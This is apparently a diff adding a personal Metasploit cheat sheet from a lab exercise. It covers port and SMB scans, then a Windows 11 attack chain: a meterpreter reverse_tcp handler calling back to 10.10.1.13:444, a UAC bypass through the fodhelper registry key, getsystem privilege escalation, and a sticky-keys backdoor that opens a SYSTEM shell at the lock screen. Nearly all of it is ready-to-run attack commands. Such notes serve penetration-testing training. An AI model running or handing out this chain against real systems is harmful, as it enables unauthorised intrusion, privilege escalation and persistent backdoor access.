@@ -1,0 +1,73 @@
+Msfconsole * Linux 
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+###### To SCAN Network in Metasploit ######
+
+$ search portscan [The Metasploit port scanning modules appear]
+
+$ use auxiliary/scanner/portscan/syn [To perform an SYN scan on the target systems]
+$ set INTERFACE eth0
+$ set PORTS 80 [PORTS: specifies the ports to scan (e.g., 22-25, 80, 110-900)]
+$ set RHOSTS 10.10.1.5-23 [RHOSTS: specifies the target address range or CIDR identifier]
+$ set THREADS 50 [THREADS: specifies the number of concurrent threads (default 1)]
+$ run 
+
+___________________________________________________________________________
+
+$ use auxiliary/scanner/portscan/tcp [To perform a TCP scan for open ports on the target systems]
+
+$ show options [command to view module options]
+
+___________________________________________________________________________
+
+$ use auxiliary/scanner/smb/smb_version [to run a SMB version scan against the target IP]
+
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+$ Run msfconsole command [in the terminal window to launch Metasploit Framework]
+
+$ use exploit/multi/handler [press Enter]
+
+$ type set payload windows/meterpreter/reverse_tcp [press Enter]
+
+$ Type set lhost 10.10.1.13 [press Enter to set lhost]
+
+$ Type set lport 444 [press Enter to set lport]
+
+$ run 
+
+$ Type background and press Enter [to background the current session]
+
+$ Type search bypassuac and press Enter [to get the list of bypassuac modules]
+[we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit]
+
+$ type use exploit/windows/local/bypassuac_fodhelper 
+
+$ Type set session 1 and press Enter
+
+$ show options 
+
+$ type set LHOST 10.10.1.13 
+
+$ type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID) [To set the TARGET option]
+
+$ Type exploit [to begin the exploit on Windows 11 machine]
+
+$ Type getsystem -t 1 [to elevate privileges]
+
+$ getuid [should show as system privileges now ]
+
+____________________________________________________________
+
+$ Type use post/windows/manage/sticky_keys [use sticky_keys module present in Metasploit to exploit the sticky keys feature in Windows 11]
+
+$ type sessions -i* [to list the sessions in meterpreter]
+
+$ type set session 2 [to set the privileged session as the current session]
+
+$ exploit 
+
+[Martin is a user account without any admin privileges, lock the system and from the lock screen press Shift key 5 times, this will open a command prompt on the lock screen with System privileges instead of sticky keys error window]
+
